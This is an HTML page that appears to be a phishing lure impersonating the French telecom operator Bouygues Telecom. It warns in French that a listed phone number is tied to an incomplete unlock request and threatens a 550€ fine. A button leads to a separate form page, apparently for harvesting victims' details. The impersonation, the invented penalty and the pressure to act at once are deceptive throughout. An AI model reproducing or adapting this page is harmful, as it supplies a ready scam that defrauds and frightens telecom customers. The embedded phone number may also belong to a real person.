<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="Important Notice from Bouygues Telecom">
    <title>Avertissement - Bouygues Telecom</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f8d7da;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .container {
            background-color: #fff;
            border: 2px solid #f5c6cb;
            border-radius: 10px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
            max-width: 700px;
            width: 90%;
            padding: 20px;
            text-align: center;
        }
        h1 {
            color: #721c24;
            font-size: 28px;
            margin-bottom: 20px;
        }
        p {
            color: #721c24;
            font-size: 18px;
            margin: 10px 0;
        }
        .number {
            font-weight: bold;
            color: #d9534f;
            font-size: 20px;
        }
        .amount {
            font-weight: bold;
            color: #dc3545;
            font-size: 24px;
            margin: 20px 0;
        }
        .cta {
            margin-top: 20px;
        }
        .cta button {
            background-color: #c82333;
            color: #fff;
            border: none;
            padding: 15px 30px;
            border-radius: 5px;
            cursor: pointer;
            font-size: 18px;
            text-transform: uppercase;
            transition: background-color 0.3s;
        }
        .cta button:hover {
            background-color: #a71d2a;
        }
        .warning-icon {
            font-size: 50px;
            color: #dc3545;
            margin-bottom: 20px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="warning-icon">⚠️</div>
        <h1>Avertissement Urgent</h1>
        <p>Votre numéro <span class="number">+33612782507</span> est associé à une demande de déblocage non complétée.</p>
        <p>Une amende de <span class="amount">550€</span> sera appliquée si aucune action n'est prise immédiatement.</p>
        <p>Service : <strong>Remboursement</strong></p>
        <div class="cta">
            <button onclick="window.location.href='formulaire.html';">Remplir le Formulaire Maintenant</button>
        </div>
        <p>Veuillez agir rapidement pour éviter des frais supplémentaires.</p>
    </div>
</body>
</html>
